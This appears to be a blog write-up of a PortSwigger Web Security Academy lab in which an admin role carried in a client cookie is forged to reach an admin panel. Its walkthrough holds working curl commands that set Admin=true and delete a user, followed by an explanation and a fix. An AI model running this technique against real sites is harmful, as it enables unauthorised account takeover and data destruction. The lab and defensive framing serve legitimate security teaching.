---
layout: post
title: "PortSwigger: User Role Controlled by Request Parameter"
date: 2027-09-22 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, privilege-escalation, client-side-enforcement, role-cookie, admin-panel, cwe-602, cwe-284]
---

The [previous two labs](/posts/portswigger-unprotected-admin-functionality-unpredictable-url/) hid an admin panel that had no check at all. This one is subtler: the panel *does* check whether you're an administrator — it just asks the wrong party. The "are you an admin?" decision is read straight out of a cookie your own browser sends, so you simply answer "yes." It's the client-side-enforcement flavour of [broken access control](https://cwe.mitre.org/data/definitions/284.html) ([CWE-602](https://cwe.mitre.org/data/definitions/602.html)).

## Overview

The lab has a working admin panel at `/admin`. Unlike the forced-browsing labs, this path is gated — but the gate trusts a value the client fully controls. When you log in, the server sets an `Admin` cookie. The handler then admits anyone whose request carries `Admin=true`. The objective: log in as the low-privileged `wiener`, escalate, and delete `carlos`.

## The technique

When the normal user logs in, watch the response headers:

```
HTTP/2 302
location: /my-account?id=wiener
set-cookie: Admin=false; Secure; HttpOnly
set-cookie: session=...; Secure; HttpOnly; SameSite=None
```

There it is: `Admin=false`. The role isn't derived from the server-side session — it's round-tripped through a browser cookie. Flip it to `true` and the admin handler waves you through.

## Walkthrough

Log in as `wiener:peter`, keeping the cookie jar (the login form is CSRF-protected, so grab the token first):

```bash
curl -sk -c cookies.txt https://TARGET/login -o login.html
CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' login.html)
curl -sk -b cookies.txt -c cookies.txt -i https://TARGET/login \
  --data-urlencode "csrf=$CSRF" \
  --data-urlencode "username=wiener" \
  --data-urlencode "password=peter"
# -> 302 /my-account?id=wiener ; set-cookie: Admin=false
```

A normal request to the panel is refused:

```bash
curl -sk -b cookies.txt https://TARGET/admin
# "Admin interface only available if logged in as an administrator"
```

Resend it with the role cookie forced to `true` and the panel opens — the full Users list with delete links:

```bash
SESSION=$(grep -oP 'session\t\K\S+' cookies.txt)
curl -sk -b "session=$SESSION; Admin=true" https://TARGET/admin
# <h1>Users</h1> ... <a href="/admin/delete?username=carlos">Delete</a>
```

Fire the privileged action with the same forced cookie:

```bash
curl -sk -b "session=$SESSION; Admin=true" "https://TARGET/admin/delete?username=carlos"
# -> 302 /admin   (carlos deleted)
```

The lab status flips to **Solved**.

## Why it worked

Authorization state lived in a **client-supplied cookie** (`Admin`) instead of in the server's session. The server trusted whatever the browser sent, and the browser can send anything — so `false` becomes `true`. The same bug wears other clothes: `?roleid=1`, `isAdmin=true`, a hidden `<input>` — any time a security flag makes a round trip through the client, the client owns it.

This is distinct from the forced-browsing labs: there the path had *no* check; here the path *is* checked, but against attacker-controlled data, which is just as broken.

## The fix

- Derive the role **server-side** from the authenticated session on every request — never read it from a cookie, query parameter, or header.
- Deny by default on privileged endpoints and re-check the role for each admin action.
- Never store security-relevant flags (`isAdmin`, `role`) in client-readable cookies.
